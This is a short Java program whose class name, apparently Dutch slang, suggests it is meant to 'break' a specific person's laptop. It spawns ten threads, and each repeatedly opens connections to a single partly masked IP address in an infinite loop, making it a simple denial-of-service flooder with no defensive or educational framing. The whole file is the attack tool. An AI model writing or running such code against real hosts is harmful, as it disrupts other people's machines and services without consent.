import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;


public class BreekAedesLaptop {
	public static void main(String[] args) throws MalformedURLException{
		for(int i = 0; i < 10; i++){
			new BreekThread(new URL("http://130.89.91.nogwat")).start();
		}
	}

}


class BreekThread extends Thread{
	public URL breekSocket;
	
	public BreekThread(URL breekSocket){
		this.breekSocket = breekSocket;
	}
	
	public void run(){
		while (true){
			try {
				InputStream swek = breekSocket.openStream();
				breekSocket.openConnection();
				swek.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
}

